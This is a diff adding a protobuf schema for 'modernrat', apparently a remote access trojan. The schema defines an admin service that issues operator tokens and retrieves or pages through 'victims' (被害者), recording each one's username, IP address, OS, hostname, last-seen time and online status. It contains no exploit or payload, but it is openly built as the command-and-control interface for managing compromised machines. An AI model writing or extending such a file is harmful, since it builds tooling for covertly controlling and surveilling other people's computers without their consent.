@@ -1,0 +1,77 @@
+syntax = "proto3";
+
+package modernrat;
+
+option go_package = "github.com/modernrat/proto";
+
+import "victim_registration.proto";
+
+// 管理者向けサービス
+service AdminService {
+  // 管理者トークンを発行する
+  rpc GenerateAdminToken(GenerateAdminTokenRequest) returns (GenerateAdminTokenResponse);
+
+  // 被害者情報を取得する
+  rpc GetUser(GetUserRequest) returns (GetUserResponse);
+
+  // 被害者リストを取得する
+  rpc ListUsers(ListUsersRequest) returns (ListUsersResponse);
+}
+
+// 管理者トークン発行リクエスト
+message GenerateAdminTokenRequest {
+  string password = 1;                // 管理者パスワード
+  int64 ttl_seconds = 2;              // トークンの有効期限（秒）（オプション）
+}
+
+// 管理者トークン発行レスポンス
+message GenerateAdminTokenResponse {
+  bool success = 1;                   // 発行成功フラグ
+  string token = 2;                   // 発行されたトークン
+  string message = 3;                 // メッセージ
+  int64 expires_at = 4;               // トークンの有効期限（Unix秒）
+}
+
+// 被害者情報取得リクエスト
+message GetUserRequest {
+  string user_id = 1;                 // 被害者ID
+}
+
+// 被害者情報取得レスポンス
+message GetUserResponse {
+  bool success = 1;                   // 取得成功フラグ
+  string user_id = 2;                 // 被害者ID
+  SystemInfo system_info = 3;         // システム情報
+  int64 registered_at = 4;            // 登録日時
+  int64 last_seen = 5;                // 最終接続日時
+  string message = 6;                 // メッセージ
+}
+
+// 被害者リスト取得リクエスト
+message ListUsersRequest {
+  int32 page = 1;                     // ページ番号
+  int32 page_size = 2;                // ページサイズ
+  string filter = 3;                  // フィルタ条件（オプション）
+}
+
+// 被害者サマリー情報
+message UserSummary {
+  string user_id = 1;                 // 被害者ID
+  string username = 2;                // 被害者名
+  string ip_address = 3;              // IPアドレス
+  string os_name = 4;                 // OS名
+  string hostname = 5;                // ホスト名
+  int64 registered_at = 6;            // 登録日時
+  int64 last_seen = 7;                // 最終接続日時
+  bool is_online = 8;                 // オンライン状態
+}
+
+// 被害者リスト取得レスポンス
+message ListUsersResponse {
+  bool success = 1;                   // 取得成功フラグ
+  repeated UserSummary users = 2;     // 被害者一覧
+  int32 total_count = 3;              // 総被害者数
+  int32 page = 4;                     // 現在のページ
+  int32 page_size = 5;                // ページサイズ
+  string message = 6;                 // メッセージ
+}
